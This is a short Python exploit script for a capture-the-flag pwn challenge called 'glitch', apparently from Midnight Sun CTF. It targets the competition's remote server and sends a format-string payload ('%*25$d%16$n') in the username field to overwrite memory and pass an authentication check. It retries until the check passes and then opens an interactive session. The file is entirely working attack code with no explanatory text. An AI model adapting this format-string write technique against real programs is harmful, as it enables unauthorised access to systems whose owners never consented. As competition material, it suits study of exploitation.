#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './glitch'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'pwn.midnightsunctf.se', 'port':11111})
env.select('remote')

#==========

def attack(conn):
    conn.sendlineafter('username: ', '%*25$d%16$n')
    conn.sendlineafter('code: ', '0')
    return 'PASSED' in conn.recvuntil('!')

#==========

if __name__=='__main__':
    while True:
        conn = communicate(env.mode, **env.target)
        if attack(conn):
            break
        else:
            conn.close()

    conn.interactive()
   
#==========
